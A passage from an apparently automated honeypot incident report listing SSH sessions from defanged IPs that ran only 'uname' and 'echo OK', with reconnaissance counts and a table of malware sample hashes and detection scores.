**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:38:37` | `cowrie.session.connect` |
| `2026-06-27 14:38:37` | `cowrie.client.version` |
| `2026-06-27 14:38:37` | `cowrie.client.kex` |
| `2026-06-27 14:38:38` | `cowrie.login.success` |
| `2026-06-27 14:38:39` | `cowrie.session.params` |
| `2026-06-27 14:38:39` | `cowrie.command.input` |
| `2026-06-27 14:38:39` | `cowrie.log.closed` |
| `2026-06-27 14:38:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ba54bdff1d7

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:39 |
| **Last Seen** | 2026-06-27 14:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:39:32` | `cowrie.session.connect` |
| `2026-06-27 14:39:32` | `cowrie.client.version` |
| `2026-06-27 14:39:32` | `cowrie.client.kex` |
| `2026-06-27 14:39:32` | `cowrie.login.success` |
| `2026-06-27 14:39:33` | `cowrie.session.params` |
| `2026-06-27 14:39:33` | `cowrie.command.input` |
| `2026-06-27 14:39:33` | `cowrie.log.closed` |
| `2026-06-27 14:39:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1780895aa8dc

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:40 |
| **Last Seen** | 2026-06-27 14:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:40:24` | `cowrie.session.connect` |
| `2026-06-27 14:40:24` | `cowrie.client.version` |
| `2026-06-27 14:40:24` | `cowrie.client.kex` |
| `2026-06-27 14:40:25` | `cowrie.login.success` |
| `2026-06-27 14:40:25` | `cowrie.session.params` |
| `2026-06-27 14:40:25` | `cowrie.command.input` |
| `2026-06-27 14:40:25` | `cowrie.log.closed` |
| `2026-06-27 14:40:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a1e7d1bbfe6

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-27 14:40 |
| **Last Seen** | 2026-06-27 14:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:40:56` | `cowrie.session.connect` |
| `2026-06-27 14:40:57` | `cowrie.client.version` |
| `2026-06-27 14:40:57` | `cowrie.client.kex` |
| `2026-06-27 14:40:58` | `cowrie.login.success` |
| `2026-06-27 14:41:00` | `cowrie.session.params` |
| `2026-06-27 14:41:00` | `cowrie.command.input` |
| `2026-06-27 14:41:00` | `cowrie.log.closed` |
| `2026-06-27 14:41:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4b37c24e359

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:41 |
| **Last Seen** | 2026-06-27 14:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:41:17` | `cowrie.session.connect` |
| `2026-06-27 14:41:17` | `cowrie.client.version` |
| `2026-06-27 14:41:17` | `cowrie.client.kex` |
| `2026-06-27 14:41:17` | `cowrie.login.success` |
| `2026-06-27 14:41:18` | `cowrie.session.params` |
| `2026-06-27 14:41:18` | `cowrie.command.input` |
| `2026-06-27 14:41:18` | `cowrie.log.closed` |
| `2026-06-27 14:41:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cb0ed797203

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:42 |
| **Last Seen** | 2026-06-27 14:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:42:10` | `cowrie.session.connect` |
| `2026-06-27 14:42:10` | `cowrie.client.version` |
| `2026-06-27 14:42:10` | `cowrie.client.kex` |
| `2026-06-27 14:42:10` | `cowrie.login.success` |
| `2026-06-27 14:42:11` | `cowrie.session.params` |
| `2026-06-27 14:42:11` | `cowrie.command.input` |
| `2026-06-27 14:42:11` | `cowrie.log.closed` |
| `2026-06-27 14:42:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a09046c6439

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:43 |
| **Last Seen** | 2026-06-27 14:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:43:03` | `cowrie.session.connect` |
| `2026-06-27 14:43:03` | `cowrie.client.version` |
| `2026-06-27 14:43:03` | `cowrie.client.kex` |
| `2026-06-27 14:43:03` | `cowrie.login.success` |
| `2026-06-27 14:43:04` | `cowrie.session.params` |
| `2026-06-27 14:43:04` | `cowrie.command.input` |
| `2026-06-27 14:43:04` | `cowrie.log.closed` |
| `2026-06-27 14:43:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a66f0dfa0e37

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:43 |
| **Last Seen** | 2026-06-27 14:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:43:57` | `cowrie.session.connect` |
| `2026-06-27 14:43:57` | `cowrie.client.version` |
| `2026-06-27 14:43:57` | `cowrie.client.kex` |
| `2026-06-27 14:43:58` | `cowrie.login.success` |
| `2026-06-27 14:43:58` | `cowrie.session.params` |
| `2026-06-27 14:43:58` | `cowrie.command.input` |
| `2026-06-27 14:43:58` | `cowrie.log.closed` |
| `2026-06-27 14:43:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc459f6931ed

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:44 |
| **Last Seen** | 2026-06-27 14:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:44:54` | `cowrie.session.connect` |
| `2026-06-27 14:44:54` | `cowrie.client.version` |
| `2026-06-27 14:44:54` | `cowrie.client.kex` |
| `2026-06-27 14:44:54` | `cowrie.login.success` |
| `2026-06-27 14:44:55` | `cowrie.session.params` |
| `2026-06-27 14:44:55` | `cowrie.command.input` |
| `2026-06-27 14:44:55` | `cowrie.log.closed` |
| `2026-06-27 14:44:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-680743605448

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:45 |
| **Last Seen** | 2026-06-27 14:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:45:46` | `cowrie.session.connect` |
| `2026-06-27 14:45:46` | `cowrie.client.version` |
| `2026-06-27 14:45:46` | `cowrie.client.kex` |
| `2026-06-27 14:45:47` | `cowrie.login.success` |
| `2026-06-27 14:45:47` | `cowrie.session.params` |
| `2026-06-27 14:45:47` | `cowrie.command.input` |
| `2026-06-27 14:45:48` | `cowrie.log.closed` |
| `2026-06-27 14:45:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5f57350a532

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:46 |
| **Last Seen** | 2026-06-27 14:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:46:39` | `cowrie.session.connect` |
| `2026-06-27 14:46:39` | `cowrie.client.version` |
| `2026-06-27 14:46:40` | `cowrie.client.kex` |
| `2026-06-27 14:46:40` | `cowrie.login.success` |
| `2026-06-27 14:46:41` | `cowrie.session.params` |
| `2026-06-27 14:46:41` | `cowrie.command.input` |
| `2026-06-27 14:46:41` | `cowrie.log.closed` |
| `2026-06-27 14:46:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-546f44c3b044

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:47 |
| **Last Seen** | 2026-06-27 14:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:47:33` | `cowrie.session.connect` |
| `2026-06-27 14:47:33` | `cowrie.client.version` |
| `2026-06-27 14:47:33` | `cowrie.client.kex` |
| `2026-06-27 14:47:33` | `cowrie.login.success` |
| `2026-06-27 14:47:34` | `cowrie.session.params` |
| `2026-06-27 14:47:34` | `cowrie.command.input` |
| `2026-06-27 14:47:34` | `cowrie.log.closed` |
| `2026-06-27 14:47:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c50d542878ab

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:48 |
| **Last Seen** | 2026-06-27 14:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:48:27` | `cowrie.session.connect` |
| `2026-06-27 14:48:27` | `cowrie.client.version` |
| `2026-06-27 14:48:27` | `cowrie.client.kex` |
| `2026-06-27 14:48:27` | `cowrie.login.success` |
| `2026-06-27 14:48:28` | `cowrie.session.params` |
| `2026-06-27 14:48:28` | `cowrie.command.input` |
| `2026-06-27 14:48:28` | `cowrie.log.closed` |
| `2026-06-27 14:48:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e62cfc633f44

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-27 14:49 |
| **Last Seen** | 2026-06-27 14:49 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:49:16` | `cowrie.session.connect` |
| `2026-06-27 14:49:18` | `cowrie.client.version` |
| `2026-06-27 14:49:18` | `cowrie.client.kex` |
| `2026-06-27 14:49:24` | `cowrie.login.success` |
| `2026-06-27 14:49:27` | `cowrie.session.params` |
| `2026-06-27 14:49:27` | `cowrie.command.input` |
| `2026-06-27 14:49:28` | `cowrie.log.closed` |
| `2026-06-27 14:49:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a78ded21397e

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:49 |
| **Last Seen** | 2026-06-27 14:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:49:21` | `cowrie.session.connect` |
| `2026-06-27 14:49:21` | `cowrie.client.version` |
| `2026-06-27 14:49:21` | `cowrie.client.kex` |
| `2026-06-27 14:49:22` | `cowrie.login.success` |
| `2026-06-27 14:49:22` | `cowrie.session.params` |
| `2026-06-27 14:49:22` | `cowrie.command.input` |
| `2026-06-27 14:49:22` | `cowrie.log.closed` |
| `2026-06-27 14:49:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49c863670c68

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:50 |
| **Last Seen** | 2026-06-27 14:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:50:15` | `cowrie.session.connect` |
| `2026-06-27 14:50:15` | `cowrie.client.version` |
| `2026-06-27 14:50:15` | `cowrie.client.kex` |
| `2026-06-27 14:50:15` | `cowrie.login.success` |
| `2026-06-27 14:50:16` | `cowrie.session.params` |
| `2026-06-27 14:50:16` | `cowrie.command.input` |
| `2026-06-27 14:50:16` | `cowrie.log.closed` |
| `2026-06-27 14:50:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aff3de7822c5

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:51 |
| **Last Seen** | 2026-06-27 14:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:51:08` | `cowrie.session.connect` |
| `2026-06-27 14:51:08` | `cowrie.client.version` |
| `2026-06-27 14:51:08` | `cowrie.client.kex` |
| `2026-06-27 14:51:08` | `cowrie.login.success` |
| `2026-06-27 14:51:09` | `cowrie.session.params` |
| `2026-06-27 14:51:09` | `cowrie.command.input` |
| `2026-06-27 14:51:09` | `cowrie.log.closed` |
| `2026-06-27 14:51:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00e3ef6c62e1

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:52 |
| **Last Seen** | 2026-06-27 14:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:52:01` | `cowrie.session.connect` |
| `2026-06-27 14:52:01` | `cowrie.client.version` |
| `2026-06-27 14:52:02` | `cowrie.client.kex` |
| `2026-06-27 14:52:02` | `cowrie.login.success` |
| `2026-06-27 14:52:03` | `cowrie.session.params` |
| `2026-06-27 14:52:03` | `cowrie.command.input` |
| `2026-06-27 14:52:03` | `cowrie.log.closed` |
| `2026-06-27 14:52:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c99d7d22f897

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:52 |
| **Last Seen** | 2026-06-27 14:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:52:56` | `cowrie.session.connect` |
| `2026-06-27 14:52:56` | `cowrie.client.version` |
| `2026-06-27 14:52:56` | `cowrie.client.kex` |
| `2026-06-27 14:52:56` | `cowrie.login.success` |
| `2026-06-27 14:52:57` | `cowrie.session.params` |
| `2026-06-27 14:52:57` | `cowrie.command.input` |
| `2026-06-27 14:52:57` | `cowrie.log.closed` |
| `2026-06-27 14:52:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c955c5d51a3

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:53 |
| **Last Seen** | 2026-06-27 14:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:53:50` | `cowrie.session.connect` |
| `2026-06-27 14:53:50` | `cowrie.client.version` |
| `2026-06-27 14:53:50` | `cowrie.client.kex` |
| `2026-06-27 14:53:50` | `cowrie.login.success` |
| `2026-06-27 14:53:51` | `cowrie.session.params` |
| `2026-06-27 14:53:51` | `cowrie.command.input` |
| `2026-06-27 14:53:51` | `cowrie.log.closed` |
| `2026-06-27 14:53:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-410187a2507e

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:54 |
| **Last Seen** | 2026-06-27 14:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:54:45` | `cowrie.session.connect` |
| `2026-06-27 14:54:45` | `cowrie.client.version` |
| `2026-06-27 14:54:45` | `cowrie.client.kex` |
| `2026-06-27 14:54:46` | `cowrie.login.success` |
| `2026-06-27 14:54:47` | `cowrie.session.params` |
| `2026-06-27 14:54:47` | `cowrie.command.input` |
| `2026-06-27 14:54:47` | `cowrie.log.closed` |
| `2026-06-27 14:54:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `157.230.42[.]17` | **231** | 2026-06-27 12:55 | 2026-06-27 14:54 | 150m | 0 | `T1592` | 🟠 MEDIUM |
| `209.99.185[.]59` | **129** | 2026-06-27 12:55 | 2026-06-27 14:54 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `212.8.242[.]38` | **3** | 2026-06-27 13:53 | 2026-06-27 14:47 | 1m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]86` | **3** | 2026-06-27 14:02 | 2026-06-27 14:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.79.8[.]221` | **2** | 2026-06-27 14:32 | 2026-06-27 14:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]2` | 1 | 2026-06-27 14:12 | 2026-06-27 14:12 | 10s | 0 | `T1592` | 🟢 LOW |
| `141.11.88[.]100` | 1 | 2026-06-27 13:31 | 2026-06-27 13:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `159.65.233[.]253` | 1 | 2026-06-27 14:31 | 2026-06-27 14:33 | 69s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]8` | 1 | 2026-06-27 13:32 | 2026-06-27 13:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]245` | 1 | 2026-06-27 13:32 | 2026-06-27 13:32 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 61/100 | 🟡 MEDIUM | **3/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 51/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 64/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 43/100 | 🟡 MEDIUM | **9/75** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 44/100 | 🟡 MEDIUM | **11/75** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 48/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 51/100 | 🟡 MEDIUM | **29/75** 🔴 |
